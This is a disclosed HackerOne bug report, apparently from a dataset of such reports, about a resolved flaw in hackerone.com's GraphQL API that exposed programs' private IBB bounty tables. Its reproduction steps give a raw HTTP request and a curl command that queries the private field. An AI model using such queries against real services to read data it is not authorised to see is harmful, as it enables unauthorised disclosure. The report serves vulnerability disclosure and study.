---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2322082'
original_report_id: '2322082'
title: Being able to disclose IBB bounty table of any public program
weakness: Information Disclosure
team_handle: security
created_at: '2024-01-16T13:34:59.306Z'
disclosed_at: '2024-03-17T10:33:32.545Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 64
asset_identifier: hackerone.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# Being able to disclose IBB bounty table of any public program

## Metadata

- HackerOne Report ID: 2322082
- Weakness: Information Disclosure
- Program: security
- Disclosed At: 2024-03-17T10:33:32.545Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**

Hi there, I hope you are doing well :)

According to  https://docs.hackerone.com/en/articles/8496298-internet-bug-bounty 

██████

It says "You can opt-in by setting up your bounty table on your main program’s rewards settings page (instructions below). This bounty table is private and indicates how much you will award for vulnerabilities discovered in open-source projects"

Which means the IBB bounty table is private but i was able to disclose IBB bounty table


### Steps To Reproduce

1.  Send this HTTP request:

```HTTP


POST /graphql HTTP/2
Host: hackerone.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: application/json
Content-Type: application/json
Content-Length: 157
Te: trailers

{"query":"{\r\n  team(handle: \"security\") {\r\n\r\nibb_bounty_table {\r\n      critical\r\n      high\r\n      medium\r\n      low\r\n    }\r\n}\r\n}\r\n"}

```

OR 

run this curl command :


```

curl -i -s -k -X $'POST' \
    -H $'Host: hackerone.com' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0' -H $'Accept: application/json' -H $'Content-Type: application/json' -H $'Content-Length: 157' -H $'Te: trailers' \
    --data-binary $'{\"query\":\"{\\r\\n  team(handle: \\\"security\\\") {\\r\\n\\r\\nibb_bounty_table {\\r\\n      critical\\r\\n      high\\r\\n      medium\\r\\n      low\\r\\n    }\\r\\n}\\r\\n}\\r\\n\"}' \
    $'https://hackerone.com/graphql'

```
it will disclose IBB bounty table of Hackerone:

█████

## Impact

Private information disclosure

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
